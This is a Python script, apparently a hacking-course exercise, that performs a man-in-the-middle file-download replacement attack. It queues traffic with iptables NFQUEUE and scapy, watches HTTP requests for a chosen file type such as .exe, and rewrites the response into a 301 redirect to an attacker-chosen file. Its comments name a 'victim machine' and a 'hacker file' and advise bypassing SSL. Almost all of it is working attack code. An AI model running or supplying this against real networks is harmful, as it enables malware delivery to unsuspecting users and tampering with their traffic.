#!/usr/bin/env python3

  #first create a queue using command: "iptables -I FORWARD -j NFQUEUE --queue-num 0"
  #where 0 is queue number, it can be any number of developer choice and it's only for the forwarded packets
  #queue is created so packets can be modified and then forwarded to the victim machine
  #Make sure you bypass the ssl encryption



import netfilterqueue                               #module to access queue from python program
import scapy.all as scapy
import subprocess
import optparse


def get_arguements():
    # Parse the arguements from command line
    parser = optparse.OptionParser()                                            
    parser.add_option("-f", "--filetype", dest="filetype", help="File Type to be reaplaced.(eg:- .exe, .png)")               
    parser.add_option("-p","--path",dest="path",help="File Path")
    options=parser.parse_args() [0]                                               

    # checks required options are provided or not
    if not options.filetype:
        parser.error("[-]Please specify the type of file to be intercepted,use --help for more info")
    elif not options.path:
        parser.error("[-]Please specify the path of the file ,use --help for more info")

    return options


def flush():
    # Flush the iptables rule created at the beginning
    flush_result=subprocess.check_output("iptables --flush",shell=True)
    if not flush_result:
        print("[+] Successfully flushed iptables")


def set_load(packet, load):                     #function to modify packet to dowanload hacker file
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len                       # deleting the length and chcksum fields to prevent the packet corruption
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    # Modify and play with the packets
    scapy_packet = scapy.IP(packet.get_payload())               #wrapping the payload of this scapy IP layer and converting into scapy layer
                                                                #get_payload method to view moare info
    if scapy_packet.haslayer(scapy.Raw):                        #checks layer where data is stored
        global options
        if scapy_packet[scapy.TCP].dport==80:                   #to recognise request
            load=scapy_packet[scapy.Raw].load.decode(errors="ignore")
            if options.filetype in load and options.path not in load:          #checks if load field contain certain file type
                print("[+] " + options.filetype + " Request *********")
                ack_list.append(scapy_packet[scapy.TCP].ack)    #adds ack id og request to list if target requested exe filetype
                # print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport==80:                 #to recognise response
            if scapy_packet[scapy.TCP].seq in ack_list:         #checks if response is for the request
                ack_list.remove(scapy_packet[scapy.TCP].seq)    #removes the seq(ack) for list,if response is for the required request
                print("[+] Replacing file .........")
                modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: " + options.path + "\n\n")
                # print(modified_packet.show())

                packet.set_payload(bytes(modified_packet))               #replacing the real packet with modified packet


       # print(scapy_packet.show())                     #scapy method to get more details
    packet.accept()                                     #to allow the packet to reach their destination(target)
    # packet.drop()                                     #to drop the packets [CUTS the INTERNET of the target]


def queue_bind():
    # Binds the queue with id 0
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)                 
    queue.run()


def queue_create(): 
    # # For capturing all the packets that are forwarded 
    # create_result = subprocess.check_output("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)  #for the packets to be forwarded
    # if not create_result:
    #     print("[+] Queue created with OUTPUT chain")

    # For the local machine 
    create_result = subprocess.check_output("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)  #for packets going out of my machine
    if not create_result:
        print("[+] Queue created with OUTPUT chain")
    create_result = subprocess.check_output("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)  #for packets coming to my machine
    if not create_result:
        print("[+] Queue created with INPUT chain")


# main code
ack_list=[]                                             #list for storing packet ack number to recognise its response
options= get_arguements()
queue_create()
try:
    queue_bind()
except KeyboardInterrupt:
    print("[+]Detected Ctrl+C.....flushing iptables.....")
    flush()